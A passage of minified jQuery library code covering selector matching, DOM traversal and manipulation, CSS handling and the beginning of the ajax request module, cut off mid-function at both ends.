b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=o.filters[e];if(f)return f(a,c,b,d);if(e==="contains")return(a.textContent||a.innerText||n([a])||"").indexOf(b[3])>=0;if(e==="not"){var g=b[3];for(var h=0,i=g.length;h<i;h++)if(g[h]===a)return!1;return!0}m.error(e)},CHILD:function(a,b){var c,e,f,g,h,i,j,k=b[1],l=a;switch(k){case"only":case"first":while(l=l.previousSibling)if(l.nodeType===1)return!1;if(k==="first")return!0;l=a;case"last":while(l=l.nextSibling)if(l.nodeType===1)return!1;return!0;case"nth":c=b[2],e=b[3];if(c===1&&e===0)return!0;f=b[0],g=a.parentNode;if(g&&(g[d]!==f||!a.nodeIndex)){i=0;for(l=g.firstChild;l;l=l.nextSibling)l.nodeType===1&&(l.nodeIndex=++i);g[d]=f}j=a.nodeIndex-e;return c===0?j===0:j%c===0&&j/c>=0}},ID:function(a,b){return a.nodeType===1&&a.getAttribute("id")===b},TAG:function(a,b){return b==="*"&&a.nodeType===1||!!a.nodeName&&a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=m.attr?m.attr(a,c):o.attrHandle[c]?o.attrHandle[c](a):a[c]!=null?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];return d==null?f==="!=":!f&&m.attr?d!=null:f==="="?e===g:f==="*="?e.indexOf(g)>=0:f==="~="?(" "+e+" ").indexOf(g)>=0:g?f==="!="?e!==g:f==="^="?e.indexOf(g)===0:f==="$="?e.substr(e.length-g.length)===g:f==="|="?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=o.setFilters[e];if(f)return f(a,c,b,d)}}},p=o.match.POS,q=function(a,b){return"\\"+(b-0+1)};for(var r in o.match)o.match[r]=new RegExp(o.match[r].source+/(?![^\[]*\])(?![^\(]*\))/.source),o.leftMatch[r]=new RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[r].source.replace(/\\(\d+)/g,q));var s=function(a,b){a=Array.prototype.slice.call(a,0);if(b){b.push.apply(b,a);return b}return a};try{Array.prototype.slice.call(c.documentElement.childNodes,0)[0].nodeType}catch(t){s=function(a,b){var c=0,d=b||[];if(g.call(a)==="[object Array]")Array.prototype.push.apply(d,a);else if(typeof a.length=="number")for(var e=a.length;c<e;c++)d.push(a[c]);else for(;a[c];c++)d.push(a[c]);return d}}var u,v;c.documentElement.compareDocumentPosition?u=function(a,b){if(a===b){h=!0;return 0}if(!a.compareDocumentPosition||!b.compareDocumentPosition)return a.compareDocumentPosition?-1:1;return a.compareDocumentPosition(b)&4?-1:1}:(u=function(a,b){if(a===b){h=!0;return 0}if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;var c,d,e=[],f=[],g=a.parentNode,i=b.parentNode,j=g;if(g===i)return v(a,b);if(!g)return-1;if(!i)return 1;while(j)e.unshift(j),j=j.parentNode;j=i;while(j)f.unshift(j),j=j.parentNode;c=e.length,d=f.length;for(var k=0;k<c&&k<d;k++)if(e[k]!==f[k])return v(e[k],f[k]);return k===c?v(a,f[k],-1):v(e[k],b,1)},v=function(a,b,c){if(a===b)return c;var d=a.nextSibling;while(d){if(d===b)return-1;d=d.nextSibling}return 1}),function(){var a=c.createElement("div"),d="script"+(new Date).getTime(),e=c.documentElement;a.innerHTML="<a name='"+d+"'/>",e.insertBefore(a,e.firstChild),c.getElementById(d)&&(o.find.ID=function(a,c,d){if(typeof c.getElementById!="undefined"&&!d){var e=c.getElementById(a[1]);return e?e.id===a[1]||typeof e.getAttributeNode!="undefined"&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},o.filter.ID=function(a,b){var c=typeof a.getAttributeNode!="undefined"&&a.getAttributeNode("id");return a.nodeType===1&&c&&c.nodeValue===b}),e.removeChild(a),e=a=null}(),function(){var a=c.createElement("div");a.appendChild(c.createComment("")),a.getElementsByTagName("*").length>0&&(o.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);if(a[1]==="*"){var d=[];for(var e=0;c[e];e++)c[e].nodeType===1&&d.push(c[e]);c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&typeof a.firstChild.getAttribute!="undefined"&&a.firstChild.getAttribute("href")!=="#"&&(o.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),c.querySelectorAll&&function(){var a=m,b=c.createElement("div"),d="__sizzle__";b.innerHTML="<p class='TEST'></p>";if(!b.querySelectorAll||b.querySelectorAll(".TEST").length!==0){m=function(b,e,f,g){e=e||c;if(!g&&!m.isXML(e)){var h=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);if(h&&(e.nodeType===1||e.nodeType===9)){if(h[1])return s(e.getElementsByTagName(b),f);if(h[2]&&o.find.CLASS&&e.getElementsByClassName)return s(e.getElementsByClassName(h[2]),f)}if(e.nodeType===9){if(b==="body"&&e.body)return s([e.body],f);if(h&&h[3]){var i=e.getElementById(h[3]);if(!i||!i.parentNode)return s([],f);if(i.id===h[3])return s([i],f)}try{return s(e.querySelectorAll(b),f)}catch(j){}}else if(e.nodeType===1&&e.nodeName.toLowerCase()!=="object"){var k=e,l=e.getAttribute("id"),n=l||d,p=e.parentNode,q=/^\s*[+~]/.test(b);l?n=n.replace(/'/g,"\\$&"):e.setAttribute("id",n),q&&p&&(e=e.parentNode);try{if(!q||p)return s(e.querySelectorAll("[id='"+n+"'] "+b),f)}catch(r){}finally{l||k.removeAttribute("id")}}}return a(b,e,f,g)};for(var e in a)m[e]=a[e];b=null}}(),function(){var a=c.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;if(b){var d=!b.call(c.createElement("div"),"div"),e=!1;try{b.call(c.documentElement,"[test!='']:sizzle")}catch(f){e=!0}m.matchesSelector=function(a,c){c=c.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']");if(!m.isXML(a))try{if(e||!o.match.PSEUDO.test(c)&&!/!=/.test(c)){var f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return m(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;o.order.splice(1,0,"CLASS"),o.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?m.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?m.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:m.contains=function(){return!1},m.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var y=function(a,b,c){var d,e=[],f="",g=b.nodeType?[b]:b;while(d=o.match.PSEUDO.exec(a))f+=d[0],a=a.replace(o.match.PSEUDO,"");a=o.relative[a]?a+"*":a;for(var h=0,i=g.length;h<i;h++)m(a,g[h],e,c);return m.filter(f,e)};m.attr=f.attr,m.selectors.attrMap={},f.find=m,f.expr=m.selectors,f.expr[":"]=f.expr.filters,f.unique=m.uniqueSort,f.text=m.getText,f.isXMLDoc=m.isXML,f.contains=m.contains}();var L=/Until$/,M=/^(?:parents|prevUntil|prevAll)/,N=/,/,O=/^.[^:#\[\.,]*$/,P=Array.prototype.slice,Q=f.expr.match.POS,R={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(T(this,a,!1),"not",a)},filter:function(a){return this.pushStack(T(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?Q.test(a)?f(a,this.context).index(this[0])>=0:f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h=1;while(g&&g.ownerDocument&&g!==b){for(d=0;d<a.length;d++)f(g).is(a[d])&&c.push({selector:a[d],elem:g,level:h});g=g.parentNode,h++}return c}var i=Q.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(i?i.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a)return this[0]&&this[0].parentNode?this.prevAll().length:-1;if(typeof a=="string")return f.inArray(this[0],f(a));return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(S(c[0])||S(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling(a.parentNode.firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c);L.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!R[a]?f.unique(e):e,(this.length>1||N.test(d))&&M.test(a)&&(e=e.reverse());return this.pushStack(e,a,P.call(arguments).join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var V="abbr|article|aside|audio|canvas|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",W=/ jQuery\d+="(?:\d+|null)"/g,X=/^\s+/,Y=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,Z=/<([\w:]+)/,$=/<tbody/i,_=/<|&#?\w+;/,ba=/<(?:script|style)/i,bb=/<(?:script|object|embed|option|style)/i,bc=new RegExp("<(?:"+V+")","i"),bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*<!(?:\[CDATA\[|\-\-)/,bg={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]},bh=U(c);bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){if(f.isFunction(a))return this.each(function(b){var c=f(this);c.text(a.call(this,b,c.text()))});if(typeof a!="object"&&a!==b)return this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a));return f.text(this)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=f.isFunction(a);return this.each(function(c){f(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f.clean(arguments);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f.clean(arguments));return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function()
{for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&this[0].nodeType===1?this[0].innerHTML.replace(W,""):null;if(typeof a=="string"&&!ba.test(a)&&(f.support.leadingWhitespace||!X.test(a))&&!bg[(Z.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Y,"<$1></$2>");try{for(var c=0,d=this.length;c<d;c++)this[c].nodeType===1&&(f.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}else f.isFunction(a)?this.each(function(b){var c=f(this);c.html(a.call(this,b,c.html()))}):this.empty().append(a);return this},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bi(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,bp)}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i,j=a[0];b&&b[0]&&(i=b[0].ownerDocument||b[0]),i.createDocumentFragment||(i=c),a.length===1&&typeof j=="string"&&j.length<512&&i===c&&j.charAt(0)==="<"&&!bb.test(j)&&(f.support.checkClone||!bd.test(j))&&(f.support.html5Clone||!bc.test(j))&&(g=!0,h=f.fragments[j],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[j]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d,e,g,h=f.support.html5Clone||!bc.test("<"+a.nodeName)?a.cloneNode(!0):bo(a);if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bk(a,h),d=bl(a),e=bl(h);for(g=0;d[g];++g)e[g]&&bk(d[g],e[g])}if(b){bj(a,h);if(c){d=bl(a),e=bl(h);for(g=0;d[g];++g)bj(d[g],e[g])}}d=e=null;return h},clean:function(a,b,d,e){var g;b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||c);var h=[],i;for(var j=0,k;(k=a[j])!=null;j++){typeof k=="number"&&(k+="");if(!k)continue;if(typeof k=="string")if(!_.test(k))k=b.createTextNode(k);else{k=k.replace(Y,"<$1></$2>");var l=(Z.exec(k)||["",""])[1].toLowerCase(),m=bg[l]||bg._default,n=m[0],o=b.createElement("div");b===c?bh.appendChild(o):U(b).appendChild(o),o.innerHTML=m[1]+k+m[2];while(n--)o=o.lastChild;if(!f.support.tbody){var p=$.test(k),q=l==="table"&&!p?o.firstChild&&o.firstChild.childNodes:m[1]==="<table>"&&!p?o.childNodes:[];for(i=q.length-1;i>=0;--i)f.nodeName(q[i],"tbody")&&!q[i].childNodes.length&&q[i].parentNode.removeChild(q[i])}!f.support.leadingWhitespace&&X.test(k)&&o.insertBefore(b.createTextNode(X.exec(k)[0]),o.firstChild),k=o.childNodes}var r;if(!f.support.appendChecked)if(k[0]&&typeof (r=k.length)=="number")for(i=0;i<r;i++)bn(k[i]);else bn(k);k.nodeType?h.push(k):h=f.merge(h,k)}if(d){g=function(a){return!a.type||be.test(a.type)};for(j=0;h[j];j++)if(e&&f.nodeName(h[j],"script")&&(!h[j].type||h[j].type.toLowerCase()==="text/javascript"))e.push(h[j].parentNode?h[j].parentNode.removeChild(h[j]):h[j]);else{if(h[j].nodeType===1){var s=f.grep(h[j].getElementsByTagName("script"),g);h.splice.apply(h,[j+1,0].concat(s))}d.appendChild(h[j])}}return h},cleanData:function(a){var b,c,d=f.cache,e=f.event.special,g=f.support.deleteExpando;for(var h=0,i;(i=a[h])!=null;h++){if(i.nodeName&&f.noData[i.nodeName.toLowerCase()])continue;c=i[f.expando];if(c){b=d[c];if(b&&b.events){for(var j in b.events)e[j]?f.event.remove(i,j):f.removeEvent(i,j,b.handle);b.handle&&(b.handle.elem=null)}g?delete i[f.expando]:i.removeAttribute&&i.removeAttribute(f.expando),delete d[c]}}}});var bq=/alpha\([^)]*\)/i,br=/opacity=([^)]*)/,bs=/([A-Z]|^ms)/g,bt=/^-?\d+(?:px)?$/i,bu=/^-?\d/,bv=/^([\-+])=([\-+.\de]+)/,bw={position:"absolute",visibility:"hidden",display:"block"},bx=["Left","Right"],by=["Top","Bottom"],bz,bA,bB;f.fn.css=function(a,c){if(arguments.length===2&&c===b)return this;return f.access(this,a,c,!0,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)})},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=bz(a,"opacity","opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d,h==="string"&&(g=bv.exec(d))&&(d=+(g[1]+1)*+g[2]+parseFloat(f.css(a,c)),h="number");if(d==null||h==="number"&&isNaN(d))return;h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(bz)return bz(a,c)},swap:function(a,b,c){var d={};for(var e in b)d[e]=a.style[e],a.style[e]=b[e];c.call(a);for(e in b)a.style[e]=d[e]}}),f.curCSS=f.css,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){var e;if(c){if(a.offsetWidth!==0)return bC(a,b,d);f.swap(a,bw,function(){e=bC(a,b,d)});return e}},set:function(a,b){if(!bt.test(b))return b;b=parseFloat(b);if(b>=0)return b+"px"}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return br.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=f.isNumeric(b)?"alpha(opacity="+b*100+")":"",g=d&&d.filter||c.filter||"";c.zoom=1;if(b>=1&&f.trim(g.replace(bq,""))===""){c.removeAttribute("filter");if(d&&!d.filter)return}c.filter=bq.test(g)?g.replace(bq,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){var c;f.swap(a,{display:"inline-block"},function(){b?c=bz(a,"margin-right","marginRight"):c=a.style.marginRight});return c}})}),c.defaultView&&c.defaultView.getComputedStyle&&(bA=function(a,b){var c,d,e;b=b.replace(bs,"-$1").toLowerCase(),(d=a.ownerDocument.defaultView)&&(e=d.getComputedStyle(a,null))&&(c=e.getPropertyValue(b),c===""&&!f.contains(a.ownerDocument.documentElement,a)&&(c=f.style(a,b)));return c}),c.documentElement.currentStyle&&(bB=function(a,b){var c,d,e,f=a.currentStyle&&a.currentStyle[b],g=a.style;f===null&&g&&(e=g[b])&&(f=e),!bt.test(f)&&bu.test(f)&&(c=g.left,d=a.runtimeStyle&&a.runtimeStyle.left,d&&(a.runtimeStyle.left=a.currentStyle.left),g.left=b==="fontSize"?"1em":f||0,f=g.pixelLeft+"px",g.left=c,d&&(a.runtimeStyle.left=d));return f===""?"auto":f}),bz=bA||bB,f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style&&a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)});var bD=/%20/g,bE=/\[\]$/,bF=/\r?\n/g,bG=/#.*$/,bH=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bI=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bJ=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,bK=/^(?:GET|HEAD)$/,bL=/^\/\//,bM=/\?/,bN=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bO=/^(?:select|textarea)/i,bP=/\s+/,bQ=/([?&])_=[^&]*/,bR=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bS=f.fn.load,bT={},bU={},bV,bW,bX=["*/"]+["*"];try{bV=e.href}catch(bY){bV=c.createElement("a"),bV.href="",bV=bV.href}bW=bR.exec(bV.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bS)return bS.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bN,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bO.test(this.nodeName)||bI.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bF,"\r\n")}}):{name:b.name,value:c.replace(bF,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.on(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?b_(a,f.ajaxSettings):(b=a,a=f.ajaxSettings),b_(a,b);return a},ajaxSettings:{url:bV,isLocal:bJ.test(bW[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":bX},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:bZ(bT),ajaxTransport:bZ(bU),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a>0?4:0;var o,r,u,w=c,x=l?cb(d,v,l):b,y,z;if(a>=200&&a<300||a===304){if(d.ifModified){if(y=v.getResponseHeader("Last-Modified"))f.lastModified[k]=y;if(z=v.getResponseHeader("Etag"))f.etag[k]=z}if(a===304)w="notmodified",o=!0;else try{r=cc(d,x),w="success",o=!0}catch(A){w="parsererror",u=A}}else{u=w;if(!w||a)w="error",a<0&&(a=0)}v.status=a,v.statusText=""+(c||w),o?h.resolveWith(e,[r,w,v]):h.rejectWith(e,[v,w,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.fireWith(e,[v,w]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f.Callbacks("once memory"),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bH.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.add,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bG,"").replace(bL,bW[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bP),d.crossDomain==null&&(r=bR.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bW[1]&&r[2]==bW[2]&&(r[3]||(r[1]==="http:"?80:443))==(bW[3]||(bW[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),b$(bT,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bK.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bM.test(d.url)?"&":"?")+d.data,delete d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bQ,"$1_="+x);d.url=y+(y===d.url?(bM.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.contentType!==!1||c.contentType)&&v.setRequestHeader("Content-Type",d.contentType),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", "+bX+"; 